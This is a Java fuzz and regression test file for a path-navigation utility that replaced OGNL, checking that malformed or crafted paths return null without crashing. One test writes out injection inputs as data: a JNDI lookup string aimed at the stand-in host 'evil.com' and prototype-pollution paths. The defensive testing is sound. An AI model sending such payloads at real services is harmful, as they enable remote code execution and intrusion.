package ai.labs.eddi.utils;

import com.code_intelligence.jazzer.api.FuzzedDataProvider;
import com.code_intelligence.jazzer.junit.FuzzTest;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Coverage-guided fuzz tests for {@link PathNavigator}.
 * <p>
 * PathNavigator replaced OGNL (which had RCE CVEs) as the safe path-navigation
 * utility. These fuzz tests verify that no crafted input can cause:
 * <ul>
 * <li>Uncaught exceptions (crashes)</li>
 * <li>Stack overflows (deeply nested paths)</li>
 * <li>Out-of-memory conditions (pathological inputs)</li>
 * <li>Infinite loops (regex backtracking / ReDoS)</li>
 * </ul>
 * <p>
 * In CI, these run as standard JUnit regression tests using saved corpus
 * inputs. Run with Jazzer agent for real coverage-guided fuzzing:
 * {@code mvn test -pl . -Dtest=PathNavigatorFuzzTest -Djazzer.instrument=ai.labs.eddi.utils.PathNavigator}
 */
class PathNavigatorFuzzTest {

    /**
     * Seed data structure used across all fuzz iterations. Contains nested maps,
     * lists, numbers, and strings to exercise all PathNavigator code paths.
     */
    private static final Map<String, Object> SEED_DATA = buildSeedData();

    private static Map<String, Object> buildSeedData() {
        Map<String, Object> root = new HashMap<>();
        root.put("memory", Map.of(
                "current", Map.of(
                        "output", "hello world",
                        "input", "user said something"),
                "last", Map.of(
                        "output", "previous response")));
        root.put("properties", Map.of(
                "count", 42,
                "name", "test-agent",
                "score", 3.14,
                "flag", true,
                "tags", List.of("alpha", "beta", "gamma")));
        root.put("items", List.of(
                Map.of("name", "first", "value", 100),
                Map.of("name", "second", "value", 200),
                Map.of("name", "third", "value", 300)));
        root.put("empty", Map.of());
        root.put("nested", Map.of(
                "deep", Map.of(
                        "deeper", Map.of(
                                "deepest", "found-it"))));
        return root;
    }

    /**
     * Builds a fully mutable data structure for setValue fuzzing. Map.of() returns
     * immutable maps — setValue needs HashMap throughout.
     */
    private static Map<String, Object> buildMutableSeedData() {
        Map<String, Object> root = new HashMap<>();
        Map<String, Object> current = new HashMap<>();
        current.put("output", "hello world");
        current.put("input", "user said something");
        Map<String, Object> last = new HashMap<>();
        last.put("output", "previous response");
        Map<String, Object> memory = new HashMap<>();
        memory.put("current", current);
        memory.put("last", last);
        root.put("memory", memory);

        Map<String, Object> properties = new HashMap<>();
        properties.put("count", 42);
        properties.put("name", "test-agent");
        root.put("properties", properties);

        root.put("items", new ArrayList<>(List.of(
                new HashMap<>(Map.of("name", "first", "value", 100)),
                new HashMap<>(Map.of("name", "second", "value", 200)))));

        Map<String, Object> nested = new HashMap<>();
        Map<String, Object> deep = new HashMap<>();
        deep.put("deepest", "found-it");
        nested.put("deep", deep);
        root.put("nested", nested);
        return root;
    }

    // ── Fuzz Tests ────────────────────────────────────────────────

    @FuzzTest(maxDuration = "120s")
    void fuzzGetValue(FuzzedDataProvider data) {
        String path = data.consumeString(500);
        // Must not throw any uncaught exception
        Object result = PathNavigator.getValue(path, SEED_DATA);
        // Result is either null or a valid object — never an exception
    }

    @FuzzTest(maxDuration = "120s")
    void fuzzSetValue(FuzzedDataProvider data) {
        String path = data.consumeString(200);
        String value = data.consumeString(100);

        // Build fresh mutable data each iteration — setValue mutates nested structures
        Map<String, Object> mutableRoot = buildMutableSeedData();

        // Must not throw any uncaught exception
        PathNavigator.setValue(path, mutableRoot, value);
    }

    @FuzzTest(maxDuration = "120s")
    void fuzzArithmeticPaths(FuzzedDataProvider data) {
        // Generate paths that exercise arithmetic/concat parsing
        String leftPath = data.consumeString(100);
        String operator = data.pickValue(new String[]{"+", "-"});
        String rightPart = data.consumeString(100);
        String fullPath = leftPath + operator + rightPart;

        Object result = PathNavigator.getValue(fullPath, SEED_DATA);
        // Should return null or a computed value — never crash
    }

    // ── Regression Tests (run as standard JUnit) ──────────────────

    @Test
    void regressionEmptyPath() {
        assertNull(PathNavigator.getValue("", SEED_DATA));
        assertNull(PathNavigator.getValue(null, SEED_DATA));
    }

    @Test
    void regressionNullRoot() {
        assertNull(PathNavigator.getValue("memory.current.output", null));
    }

    @Test
    void regressionValidNavigation() {
        assertEquals("hello world", PathNavigator.getValue("memory.current.output", SEED_DATA));
        assertEquals(42, PathNavigator.getValue("properties.count", SEED_DATA));
        assertEquals("found-it", PathNavigator.getValue("nested.deep.deeper.deepest", SEED_DATA));
    }

    @Test
    void regressionArrayAccess() {
        assertEquals("first", PathNavigator.getValue("items[0].name", SEED_DATA));
        assertEquals(200, PathNavigator.getValue("items[1].value", SEED_DATA));
        // Out of bounds should return null, not crash
        assertNull(PathNavigator.getValue("items[99].name", SEED_DATA));
    }

    @Test
    void regressionArithmetic() {
        assertEquals(43, PathNavigator.getValue("properties.count+1", SEED_DATA));
    }

    @Test
    void regressionMalformedPaths() {
        // These should all return without crashing (value may or may not be null)
        PathNavigator.getValue("....", SEED_DATA); // split produces empty segments — doesn't crash
        assertNull(PathNavigator.getValue("[[[", SEED_DATA));
        // memory[999999999]: key "memory" resolves, index ignored (Map not List)
        PathNavigator.getValue("memory[999999999]", SEED_DATA);
        assertNull(PathNavigator.getValue("a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p", SEED_DATA));
        // Chained arithmetic — only one operator is parsed
        PathNavigator.getValue("properties.count+properties.count+properties.count", SEED_DATA);
    }

    @Test
    void regressionSpecialCharacters() {
        // Unicode, control characters, injection attempts
        assertNull(PathNavigator.getValue("\u0000\u0001\u0002", SEED_DATA));
        assertNull(PathNavigator.getValue("${jndi:ldap://evil.com}", SEED_DATA));
        assertNull(PathNavigator.getValue("__proto__.__proto__", SEED_DATA));
        assertNull(PathNavigator.getValue("constructor.constructor", SEED_DATA));
    }

    @Test
    void regressionNegativeIndex() {
        // Negative indices should not crash
        assertNull(PathNavigator.getValue("items[-1].name", SEED_DATA));
    }

    @Test
    void regressionMaxIntIndex() {
        assertNull(PathNavigator.getValue("items[2147483647].name", SEED_DATA));
    }

    @Test
    void regressionIntOverflow() {
        // Values exceeding Integer.MAX_VALUE must not throw NumberFormatException
        assertNull(PathNavigator.getValue("items[2147483648].name", SEED_DATA));
        assertNull(PathNavigator.getValue("items[99999999999999999].name", SEED_DATA));
    }
}
